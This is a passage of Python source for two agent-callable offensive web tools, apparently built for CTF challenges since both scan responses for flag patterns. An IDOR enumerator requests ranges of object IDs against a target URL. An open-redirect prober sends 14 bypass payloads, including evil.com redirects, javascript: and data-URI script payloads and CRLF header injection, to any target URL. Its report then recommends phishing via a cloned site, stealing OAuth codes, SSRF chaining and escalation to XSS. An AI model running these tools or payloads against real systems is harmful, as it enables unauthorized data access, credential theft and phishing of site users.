                response_lengths.append(resp_length)

                # Check for flags
                flag = self._extract_flag(resp_text)
                if flag:
                    flags_found.append((id_value, flag))
                    interesting_findings.append(
                        f"ID {id_value}: Contains potential flag pattern: {flag}"
                    )

                # Check for interesting content
                for pattern, desc in self.INTERESTING_PATTERNS:
                    if re.search(pattern, resp_text, re.IGNORECASE):
                        interesting_findings.append(f"ID {id_value}: {desc}")
                        break  # Only report first match per ID

            except requests.exceptions.Timeout:
                results_table.append({
                    "id": id_value,
                    "status": "TIMEOUT",
                    "length": 0,
                    "preview": "(request timed out)",
                })
            except Exception as exc:
                results_table.append({
                    "id": id_value,
                    "status": "ERROR",
                    "length": 0,
                    "preview": str(exc)[:100],
                })

        # Detect anomalies (responses that differ significantly from average)
        if response_lengths:
            avg_length = sum(response_lengths) / len(response_lengths)
            for entry in results_table:
                if isinstance(entry["status"], int) and entry["status"] not in (404, 403):
                    length_diff = abs(entry["length"] - avg_length)
                    if length_diff > avg_length * 0.5 and avg_length > 0 and entry["length"] > 0:
                        interesting_findings.append(
                            f"ID {entry['id']}: Response differs significantly "
                            f"({entry['length']} bytes vs ~{avg_length:.0f} avg)"
                        )

        # Build output report
        id_display = f"{range_start}-{range_end}"
        url_display = url.replace(param, "{id}") if param_type == "path" else url

        output_lines = [
            "[IdorEnumeratorTool] IDOR Enumeration Results",
            "=" * 50,
            f"URL: {url_display}",
            f"ID Range: {id_display}",
            f"Type: {id_type}",
            f"Param Type: {param_type}",
            f"Method: {method}",
            "",
        ]

        if flags_found:
            output_lines.append("!!! FLAGS FOUND !!!")
            for id_val, flag in flags_found:
                output_lines.append(f"  ID {id_val}: {flag}")
            output_lines.append("")

        output_lines.append("=== Results ===")
        output_lines.append(f"{'ID':<12} {'Status':<8} {'Length':<8} Response Preview")
        output_lines.append("-" * 70)

        for entry in results_table:
            id_str = str(entry["id"])[:10]
            status_str = str(entry["status"])
            length_str = str(entry["length"])
            preview_str = entry["preview"][:60]
            output_lines.append(f"{id_str:<12} {status_str:<8} {length_str:<8} {preview_str}")

        output_lines.append("")

        # Interesting findings
        if interesting_findings:
            # Deduplicate
            unique_findings = list(dict.fromkeys(interesting_findings))
            output_lines.append(f"=== Interesting Findings ===")
            for finding in unique_findings:
                if "flag" in finding.lower():
                    output_lines.append(f"[!] {finding}")
                else:
                    output_lines.append(f"[+] {finding}")
            output_lines.append("")
        else:
            output_lines.append("=== No anomalies detected ===")
            output_lines.append("")

        # Summary
        output_lines.append("SUMMARY:")
        status_counts: Dict[str, int] = {}
        for entry in results_table:
            s = str(entry["status"])
            status_counts[s] = status_counts.get(s, 0) + 1
        for status, count in sorted(status_counts.items()):
            output_lines.append(f"  Status {status}: {count} responses")

        return "\n".join(output_lines)

    def _make_request(
        self,
        url: str,
        method: str,
        param: str,
        param_type: str,
        param_name: str,
        id_value: str,
        headers: dict,
        form_data: dict,
        timeout: int,
    ) -> requests.Response:
        """Make request with the given ID value substituted."""
        if param_type == "path":
            # Replace the param value in the URL path
            test_url = url.replace(param, id_value, 1)
            if method == "GET":
                return self.session.get(test_url, headers=headers, timeout=timeout)
            else:
                return self.session.post(
                    test_url, data=form_data, headers=headers, timeout=timeout
                )
        elif param_type == "query":
            request_params = {**form_data, param_name: id_value}
            if method == "GET":
                return self.session.get(
                    url, params=request_params, headers=headers, timeout=timeout
                )
            else:
                return self.session.post(
                    url, data=request_params, headers=headers, timeout=timeout
                )
        else:  # body
            # Detect JSON content type
            content_type = ""
            for k, v in headers.items():
                if k.lower() == "content-type":
                    content_type = v.lower()
                    break
            use_json = "application/json" in content_type

            request_data = {**form_data, param_name: id_value}
            if method == "GET":
                return self.session.get(
                    url, params=request_data, headers=headers, timeout=timeout
                )
            elif use_json:
                return self.session.post(
                    url, json=request_data, headers=headers, timeout=timeout
                )
            else:
                return self.session.post(
                    url, data=request_data, headers=headers, timeout=timeout
                )


class OpenRedirectProbeTool:
    """
    OpenRedirectProbeTool: test for open redirect vulnerabilities.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/redirect",
          "param": "url",
          "method": "GET",
          "data": {},
          "timeout": 10
        }

    Tests for open redirect vulnerabilities using various bypass techniques
    including protocol-relative URLs, credential section abuse, JavaScript
    scheme, Unicode tricks, and CRLF header injection.
    """

    name: str = "open_redirect_probe"
    description: str = (
        "Test for open redirect vulnerabilities. Input must be JSON with 'url' "
        "(target URL) and 'param' (parameter that controls redirection). Optionally "
        "provide 'method' (GET/POST, default GET), 'data' (extra form data), and "
        "'timeout' (default 10). Tests 14 redirect bypass payloads including "
        "protocol-relative URLs, backslash tricks, credential abuse, JavaScript/data "
        "URIs, Unicode dots, and CRLF injection. Returns structured report with "
        "vulnerable payloads and exploitation suggestions."
    )

    # Redirect payloads: (payload, description)
    PAYLOADS: List[Tuple[str, str]] = [
        ("https://evil.com", "Basic external redirect"),
        ("//evil.com", "Protocol-relative URL"),
        ("/\\evil.com", "Backslash trick"),
        ("https://evil.com%2F%2F", "URL-encoded slashes"),
        ("https://target.com@evil.com", "Credential section abuse"),
        ("https://target.com.evil.com", "Subdomain confusion"),
        ("javascript:alert(1)", "JavaScript scheme"),
        ("data:text/html,<script>alert(1)</script>", "Data URI"),
        ("https://evil.com#https://target.com", "Fragment override"),
        ("https://evil.com?https://target.com", "Query string appended"),
        ("%0d%0aLocation:https://evil.com", "CRLF header injection"),
        ("https://evil%E3%80%82com", "Unicode fullwidth dot"),
        ("/redirect?url=https://evil.com", "Parameter pollution / double redirect"),
        ("https:evil.com", "Missing slashes"),
    ]

    # Flag patterns
    FLAG_PATTERNS: List[str] = [
        r"(picoCTF\{[^}]+\})",
        r"(HTB\{[^}]+\})",
        r"(THM\{[^}]+\})",
        r"(FLAG\{[^}]+\})",
        r"(flag\{[^}]+\})",
        r"(CTF\{[^}]+\})",
        r"(ctf\{[^}]+\})",
    ]

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def _extract_flag(self, text: str) -> Optional[str]:
        """Try to extract a CTF flag from response text."""
        for pattern in self.FLAG_PATTERNS:
            match = re.search(pattern, text)
            if match:
                return match.group(1)
        return None

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[OpenRedirectProbeTool] Error: Invalid JSON input. {exc}"

        url = data.get("url", "").strip() if isinstance(data.get("url"), str) else ""
        param = data.get("param", "").strip() if isinstance(data.get("param"), str) else ""
        method = (data.get("method") or "GET").upper()
        form_data = data.get("data") or {}
        timeout = data.get("timeout", 10)

        if not url:
            return "[OpenRedirectProbeTool] Error: 'url' is required."
        if not param:
            return "[OpenRedirectProbeTool] Error: 'param' (redirect parameter) is required."
        if method not in ("GET", "POST"):
            return f"[OpenRedirectProbeTool] Error: 'method' must be GET or POST, got '{method}'."

        # Get baseline response
        baseline_data = {**form_data, param: "https://example.com"}
        try:
            if method == "GET":
                baseline_resp = self.session.get(
                    url, params=baseline_data, timeout=timeout, allow_redirects=False
                )
            else:
                baseline_resp = self.session.post(
                    url, data=baseline_data, timeout=timeout, allow_redirects=False
                )
            baseline_status = baseline_resp.status_code
            baseline_length = len(baseline_resp.text)
            baseline_location = baseline_resp.headers.get("Location", "")
        except Exception as exc:
            return f"[OpenRedirectProbeTool] Error getting baseline response: {exc}"

        # Test each payload
        vulnerable_payloads = []
        flags_found = []

        for payload, description in self.PAYLOADS:
            test_data = {**form_data, param: payload}

            try:
                if method == "GET":
                    resp = self.session.get(
                        url, params=test_data, timeout=timeout, allow_redirects=False
                    )
                else:
                    resp = self.session.post(
                        url, data=test_data, timeout=timeout, allow_redirects=False
                    )

                is_vulnerable = False
                evidence = []

                # Check for redirect status with evil.com in Location
                location = resp.headers.get("Location", "")
                if resp.status_code in (301, 302, 303, 307, 308):
                    if "evil.com" in location.lower() or "evil" in location.lower():
                        is_vulnerable = True
                        evidence.append(f"Redirect to: {location}")
                    elif payload in location:
                        is_vulnerable = True
                        evidence.append(f"Payload reflected in Location: {location}")

                # Check for meta refresh redirect in body
                meta_refresh = re.search(
                    r'<meta[^>]*http-equiv=["\']?refresh["\']?[^>]*content=["\']?[^"\']*url=([^"\'>\s]+)',
                    resp.text, re.IGNORECASE
                )
                if meta_refresh:
                    redirect_url = meta_refresh.group(1)
                    if "evil.com" in redirect_url.lower() or "evil" in redirect_url.lower():
                        is_vulnerable = True
                        evidence.append(f"Meta refresh redirect to: {redirect_url}")

                # Check for JavaScript redirect in body
                js_redirect = re.search(
                    r'(?:window\.location|location\.href|location\.replace)\s*[=(]\s*["\']([^"\']+)["\']',
                    resp.text, re.IGNORECASE
                )
                if js_redirect:
                    redirect_url = js_redirect.group(1)
                    if "evil.com" in redirect_url.lower() or "evil" in redirect_url.lower():
                        is_vulnerable = True
                        evidence.append(f"JavaScript redirect to: {redirect_url}")

                # Check for JavaScript scheme execution
                if payload.startswith("javascript:") and resp.status_code in (301, 302, 303, 307, 308):
                    if "javascript:" in location.lower():
                        is_vulnerable = True
                        evidence.append(f"JavaScript URI in redirect: {location}")

                # Check for flags
                flag = self._extract_flag(resp.text)
                if flag:
                    flags_found.append(flag)
                    evidence.append(f"FLAG FOUND: {flag}")

                if is_vulnerable:
                    vulnerable_payloads.append({
                        "description": description,
                        "payload": payload,
                        "status": resp.status_code,
                        "location": location,
                        "evidence": evidence,
                    })

            except requests.exceptions.Timeout:
                pass
            except Exception:
                pass

        # Build output report
        output_lines = [
            "[OpenRedirectProbeTool] Open Redirect Probe Results",
            "=" * 55,
            f"Target: {url}",
            f"Method: {method}",
            f"Parameter: {param}",
            f"Payloads Tested: {len(self.PAYLOADS)}",
            f"Baseline Status: {baseline_status}",
            f"Baseline Location: {baseline_location or '(none)'}",
            "",
        ]

        if flags_found:
            output_lines.append("!!! FLAGS FOUND !!!")
            for flag in flags_found:
                output_lines.append(f"  {flag}")
            output_lines.append("")

        if vulnerable_payloads:
            output_lines.append(f"VULNERABLE PAYLOADS ({len(vulnerable_payloads)} found):")
            output_lines.append("-" * 40)
            for item in vulnerable_payloads:
                output_lines.append(f"  [{item['description']}]")
                output_lines.append(f"    Payload: {item['payload']}")
                output_lines.append(f"    Status: {item['status']}")
                if item["location"]:
                    output_lines.append(f"    Location: {item['location']}")
                for ev in item["evidence"]:
                    output_lines.append(f"    -> {ev}")
                output_lines.append("")
        else:
            output_lines.append("No open redirect vulnerabilities detected.")
            output_lines.append("")

        # Exploitation suggestions
        output_lines.append("RECOMMENDATIONS:")
        if vulnerable_payloads:
            output_lines.append("  [!] Open redirect confirmed!")
            output_lines.append("  - Use for phishing: redirect users to a clone of the target site")
            output_lines.append("  - Chain with OAuth flows to steal authorization codes")
            output_lines.append("  - Chain with SSRF if the redirect URL is fetched server-side")
            output_lines.append("  - Use to bypass URL allowlists/filters in other parameters")
            output_lines.append("  - Try escalating to XSS via javascript: or data: URIs")
        else:
            output_lines.append("  - No open redirects detected with standard payloads.")
            output_lines.append("  - Try double URL encoding: %2568ttps://evil.com")
            output_lines.append("  - Try using the target's own domain as a redirect chain.")
            output_lines.append("  - Check for redirect endpoints in JavaScript source code.")
            output_lines.append("  - Try different parameter names (next, return, redirect, goto, dest).")

        return "\n".join(output_lines)
